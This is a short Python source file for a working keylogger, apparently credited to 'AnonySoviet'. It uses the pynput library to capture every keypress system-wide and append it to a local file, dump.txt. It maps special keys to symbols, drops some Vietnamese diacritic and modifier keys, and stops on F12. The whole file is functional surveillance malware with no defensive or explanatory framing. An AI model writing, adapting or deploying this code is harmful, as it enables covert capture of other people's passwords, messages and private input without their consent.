
from pynput.keyboard import Listener
with open("dump.txt", "a", encoding="utf-8") as first:
        first.write("\n                  * By: AnonySoviet")
        first.write("\n =============================\n || tab = ⇋                ||\n || backspace = ↞          || \n || delete = ↠             ||\n =============================\n")


notAcceptKey = ["ă","â","ê","ô","̀","̀","̉","̃","́","̣","đ","₫","Ă","Â","Ê","Ô","Key.ctrl_l","Key.ctrl_r","Key.shift","Key.shift_r","Key.alt_gr","Key.alt_l"]

def anonymous(key):
    key = str(key).replace("'","")


    if key in notAcceptKey:
        key = ''
    match key:
        case "Key.f12":         
            # open('dump.txt', 'w').close()
            raise SystemExit(0) #tắt chương trình
        case "Key.enter": key = '\n'
        case "Key.space": key = ' '
        case 'Key.backspace': key = '↞'
        case 'Key.delete': key = '↠'
        case 'Key.left': key = '←'
        case 'Key.up': key = '↑'
        case 'Key.right': key = '→'
        case 'Key.down': key = '↓'
        case "Key.tab": key = '⇋'        
        case "Key.cmd":key = '⊞'

    with open("dump.txt", "a", encoding="utf-8") as logFile:
        logFile.write(key)


with Listener(on_press = anonymous) as getKey:
    getKey.join()
